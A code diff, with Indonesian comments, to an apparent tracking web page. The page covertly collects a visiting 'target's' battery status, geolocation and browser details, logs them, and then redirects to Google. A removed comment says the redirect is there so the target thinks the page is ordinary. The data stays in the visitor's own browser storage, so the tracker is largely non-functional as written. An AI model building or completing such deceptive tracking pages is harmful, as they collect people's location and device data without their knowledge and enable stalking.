@@ -177,7 +177,6 @@
                 battery: "Tidak tersedia"
             };
 
-            // Ambil Info Baterai jika didukung device target
             if (navigator.getBattery) {
                 try {
                     let batt = await navigator.getBattery();
@@ -197,11 +196,12 @@
                 infoData.lokasi = "Tidak terdeteksi";
             }
 
+            // Simpan log (karena GitHub Pages bersifat statis dan LocalStorage terikat di perangkat masing-masing, 
+            // pastikan Boss membuka link pelacak dan melihat dashboard di browser yang sama).
             let existingLogs = JSON.parse(localStorage.getItem('cyberscope_logs')) || [];
             existingLogs.unshift(infoData);
             localStorage.setItem('cyberscope_logs', JSON.stringify(existingLogs));
 
-            // Redirect halus setelah 2 detik agar target mengira ini halaman biasa
             setTimeout(() => {
                 window.location.href = "https://www.google.com";
             }, 2500);
@@ -211,7 +211,6 @@
             if (ua.includes("Firefox")) return "Mozilla Firefox";
             if (ua.includes("SamsungBrowser")) return "Samsung Internet";
             if (ua.includes("Opera") || ua.includes("OPR")) return "Opera";
-            if (ua.includes("Trident")) return "Internet Explorer";
             if (ua.includes("Edge")) return "Microsoft Edge";
             if (ua.includes("Chrome")) return "Google Chrome";
             if (ua.includes("Safari")) return "Apple Safari";
